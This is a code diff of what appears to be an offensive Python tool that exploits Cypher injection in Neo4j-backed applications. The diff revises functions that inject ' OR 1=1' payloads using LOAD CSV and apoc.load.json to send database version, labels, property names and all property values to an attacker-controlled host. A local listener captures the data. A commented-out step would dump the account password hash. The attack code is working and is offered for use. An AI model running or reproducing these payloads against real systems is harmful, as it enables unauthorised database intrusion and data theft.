@@ -31,71 +31,61 @@ def extract_query_params(query_string):
     matches = pattern.findall(query_string)
     return {key: value for key, value in matches}
 
-def merge_dicts(list_of_dicts):
-    """Merge a list of dictionaries into a single dictionary."""
-    merged_dict = {}
-    for single_dict in list_of_dicts:
-        merged_dict.update(single_dict)
-    return merged_dict
 
-def convert_to_json(data):
-    """Convert data structure into a JSON string."""
-    result_dict = {str(index+1): merge_dicts(item) for index, item in enumerate(data)}
-    return json.dumps(result_dict, indent=2)
+def convert_dict_to_table(data):
+    from tabulate import tabulate
 
-def write_json_to_file(json_data, filename="output.json"):
-    """Write JSON data to a file."""
-    output_dir = os.path.join(os.getcwd(), "output")
-    if not os.path.exists(output_dir):
-        os.makedirs(output_dir)
     
-    file_path = os.path.join(output_dir, filename)
-    with open(file_path, 'w') as file:
-        file.write(json_data)
-
-def json_to_table(json_data):
-    """
-    Convert JSON data into a nicely formatted table and print it.
-
-    Args:
-    - json_data: A JSON string representing the structured data.
-    """
-    # Convert the JSON string back into a Python dictionary
-    data_dict = json.loads(json_data)
-
-    # Prepare data for the tabulate library
-    # Assuming the JSON structure is a dictionary of dictionaries
-    headers = []
+    if not data:
+        return "The input data is empty."
+    
+    # add header ID
+    headers = ['ID'] + list(next(iter(data.values())).keys())
     table_data = []
-    for key, value in data_dict.items():
-        if not headers:
-            headers = ["ID"] + list(value.keys())
-        row = [key] + list(value.values())
+
+    for index, attributes in data.items():
+        # create a row for each item, prepending the index
+        # skip ID header
+        row = [index] + [attributes.get(header) for header in headers[1:]]  
         table_data.append(row)
 
-    # Generate and print the table
-    print(tabulate(table_data, headers=headers, tablefmt="grid"))
+    # Use tabulate to generate the table
+    table = tabulate(table_data, headers=headers, tablefmt="grid")
+    print(table)
 
 
-def convert_properties_to_json(properties_dict):
-    # Decode URIs and split values into lists
-    lists = {k: urllib.parse.unquote(v).split(',') for k, v in properties_dict.items()}
+def fully_dynamic_convert_data(original_data):
+    
+    converted_data = {}
 
-    # Determine the maximum list length to ensure all lists have equal length
-    max_length = max(len(lst) for lst in lists.values())
+    # Process each key in the original dictionary
+    for key, compound_value in original_data.items():
+        # Split the compound value into components based on '::'
+        components = compound_value.split('::')
+        
+        # Iterate over each component
+        for component in components:
+            # Split the component into index and the actual value, after decoding
+            index, value = component.split(':', 1)
+            value = value.replace('%20', ' ')
 
-    # Extend shorter lists with None to match the maximum length
-    for key, lst in lists.items():
-        lists[key] = lst + [None] * (max_length - len(lst))
+            # Ensure a dictionary for the index exists in converted_data
+            if index not in converted_data:
+                converted_data[index] = {}
 
-    # Zip the lists together and create a structured list of dictionaries
-    zipped = zip(*lists.values())
-    values = [[{k: v} for k, v in zip(lists.keys(), values)] for values in zipped]
-    json_result = convert_to_json(values)
-    return json_result
+            # Assign the value to the correct key within the indexed dictionary
+            converted_data[index][key] = value
+
+    # Ensure all dictionaries have all keys from the original data, set to None if not present
+    all_keys = list(original_data.keys())
+    for index_dict in converted_data.values():
+        for key in all_keys:
+            index_dict.setdefault(key, None)
+
+    return converted_data
 
 
-# Classes
+
 class RequestHandler(BaseHTTPRequestHandler):
     """Handles HTTP GET requests."""
     def do_GET(self):
@@ -199,18 +189,6 @@ class Neo4jInjector:
 
     def exfil_data(self):
 
-        print("\n[*] Version Check [*]")
-        self.inject_payload(f" OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")
-
-        data = data_queue.get()  # Retrieve the next item from the queue
-        parsed_data = extract_query_params(data)  # Use the previously defined function
-        
-        nested_dict = {'-': parsed_data}
-        json_result = json.dumps(nested_dict)
-        write_json_to_file(json_result, "version.json")
-        json_to_table(json_result)
-
-
         print("\n[*] APOC Check [*]")
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL apoc.load.json('{self.exfil_ip}/?apoc_installed=True') YIELD value RETURN value//")
         apoc_installed = True
@@ -222,21 +200,27 @@ class Neo4jInjector:
             data = data_queue.get()  # Retrieve the next item from the queue
             parsed_data = extract_query_params(data)  # Use the previously defined function
         
-    
-
         nested_dict = {'-': parsed_data}
-        json_result = json.dumps(nested_dict)
-        write_json_to_file(json_result, "apoc_installed.json")
-        json_to_table(json_result)
+        convert_dict_to_table(nested_dict)
 
         if apoc_installed:
             return True
+
+
+        print("\n[*] Version Check [*]")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT name,version,edition LOAD CSV FROM '{self.exfil_ip}/?version=' + version + '&name=' + replace(name,' ','') + '&edition=' + edition as l RETURN 0 as _0//")
+
+        data = data_queue.get()  # Retrieve the next item from the queue
+        parsed_data = extract_query_params(data)  # Use the previously defined function
+        nested_dict = {'-': parsed_data}
+        convert_dict_to_table(nested_dict)
 
         # version = parsed_data.get("version")
         # if version.parse(given_version) >= version.parse("5.0"):
         #     print(f"Version {given_version} is greater than or equal to 5.0")
         # else:
-        #     print(f"Version {given_version} is less than 5.0")
+        #     print(f"Version {given_version} is less than 5.0"
+
         # dump label count
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH COUNT(DISTINCT label) as l LOAD CSV FROM '{self.exfil_ip}/?label_count='+l as x RETURN 0 as _0 //")
 
@@ -244,7 +228,7 @@ class Neo4jInjector:
         parsed_data = extract_query_params(data)  # Use the previously defined function
         label_count = parsed_data.get('label_count')  # Extract the label value
         
-        
+        # dump labels
         self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() yield label WITH DISTINCT label LOAD CSV FROM '{self.exfil_ip}/?label='+label as l RETURN 0 as _0 //")
 
         # Store labels
@@ -262,37 +246,38 @@ class Neo4jInjector:
 
         label = input(f"\nEnter label to dump: ")
 
+        
         # Dump property count
         self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH COUNT(DISTINCT p) as y LOAD CSV FROM '{self.exfil_ip}/?property_count=' + y as l RETURN 0 as _0 //")
-
 
         data = data_queue.get()  # Retrieve the next item from the queue
         parsed_data = extract_query_params(data)  # Use the previously defined function
         property_count = parsed_data.get('property_count')  # Extract the label value
 
-
-        # print("Dumping Properties")
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties WITH REDUCE(mergedString = '', value in all_properties | mergedString+value+',') as joinedString  LOAD CSV FROM '{self.exfil_ip}/?keys='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
+        # dump properties
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties WITH REDUCE(mergedString = '', value in all_properties | mergedString+value+'::') as joinedString  LOAD CSV FROM '{self.exfil_ip}/?keys='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
 
         data = data_queue.get()
-        parsed_data = extract_query_params(data[0:-1])
+        # remove trailing ::
+        parsed_data = extract_query_params(data[0:-2])
         print(f"\navailable properties [{property_count}]:")
-        properties = parsed_data['keys'].split(',')
+        properties = parsed_data['keys'].split('::')
         for pr0perty in properties:
             print(f"[*] {pr0perty}")
 
 
         properties_dict = {}
         for pr0perty in properties:
-            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COLLECT(DISTINCT(x.{pr0perty})) AS {pr0perty}  WITH REDUCE(mergedString = '', value in {pr0perty} | mergedString+value+',') as  joinedString LOAD CSV FROM '{self.exfil_ip}/?{pr0perty}='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
+            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty} WITH COLLECT(DISTINCT(id_{pr0perty})) AS id_{pr0perty} WITH REDUCE(mergedString = '', value in id_{pr0perty} | mergedString+value+'::') as  joinedString LOAD CSV FROM '{self.exfil_ip}/?{pr0perty}='+replace(joinedString,' ', '%20') as x RETURN 0 as _0 //")
             data = data_queue.get()
-            parsed_data = extract_query_params(data[0:-1])
+            parsed_data = extract_query_params(data[0:-2])    
             properties_dict.update(parsed_data)
-
-        json_result = convert_properties_to_json(properties_dict)
+        properties_dict = fully_dynamic_convert_data(properties_dict)
+        
         print(f"\nLabel: {label}")
         print(f"[{property_count} columns]")
-        json_to_table(json_result)
+        convert_dict_to_table(properties_dict)
+
 
     def apoc_exfil_data(self):
         print("\n[*] Using APOC to Exfiltrate [*]")
@@ -306,13 +291,13 @@ class Neo4jInjector:
 
             
         # dump labels    
-        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() YIELD label WITH DISTINCT label WITH COLLECT(label) as all_label CALL apoc.load.json('{self.exfil_ip}/?labels='+apoc.text.join(all_label, ',')) YIELD value RETURN value//")
+        self.inject_payload(f" OR 1=1 WITH 1 as a CALL db.labels() YIELD label WITH DISTINCT label WITH COLLECT(label) as all_label CALL apoc.load.json('{self.exfil_ip}/?labels='+apoc.text.join(all_label, '::')) YIELD value RETURN value//")
 
         # Store labels
         data = data_queue.get()
         parsed_data = extract_query_params(data)
         print(f"\navailable labels [{label_count}]:")
-        labels = parsed_data['labels'].split(',')
+        labels = parsed_data['labels'].split('::')
         for label in labels:
             print(f"[*] {label}")
 
@@ -328,31 +313,30 @@ class Neo4jInjector:
         parsed_data = extract_query_params(data)  # Use the previously defined function
         property_count = parsed_data.get('property_count')  # Extract the label value
 
-        
 
         # print("Dumping Properties")
-        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties CALL apoc.load.json('{self.exfil_ip}/?keys=' + apoc.text.join(all_properties,',')) YIELD value RETURN value//")
+        self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as all_properties CALL apoc.load.json('{self.exfil_ip}/?keys=' + apoc.text.join(all_properties,'::')) YIELD value RETURN value//")
 
         data = data_queue.get()
         parsed_data = extract_query_params(data)
         print(f"\navailable properties [{property_count}]:")
-        properties = parsed_data['keys'].split(',')
+        properties = parsed_data['keys'].split('::')
         for pr0perty in properties:
             print(f"[*] {pr0perty}")
 
 
         properties_dict = {}
         for pr0perty in properties:
-            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH COLLECT(DISTINCT(x.{pr0perty})) AS {pr0perty} CALL apoc.load.json('{self.exfil_ip}/?{pr0perty}=' + apoc.text.join({pr0perty}, ',')) YIELD value RETURN value//")
+            self.inject_payload(f" OR 1=1 WITH 1 as a MATCH (x:{label}) WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty} WITH COLLECT(DISTINCT(id_{pr0perty})) AS id_{pr0perty} CALL apoc.load.json('{self.exfil_ip}/?{pr0perty}=' + apoc.text.join(id_{pr0perty}, '::')) YIELD value RETURN value//")
             data = data_queue.get()
             parsed_data = extract_query_params(data)
             properties_dict.update(parsed_data)
 
-        json_result = convert_properties_to_json(properties_dict)
+        properties_dict = fully_dynamic_convert_data(properties_dict)
+        
         print(f"\nLabel: {label}")
         print(f"[{property_count} columns]")
-        json_to_table(json_result)       
-
+        convert_dict_to_table(properties_dict)
 
 
 def main():
@@ -404,6 +388,10 @@ def main():
     apoc_installed = injector.exfil_data()
     if apoc_installed:
         injector.apoc_exfil_data()
+        
+        # dump_hash = input("Do you wish to dump the Neo4j account hash (Y/N)")
+        # if dump_hash == "Y":
+        #     injector.exfil_password()
 
 
     listener.stop_listener()
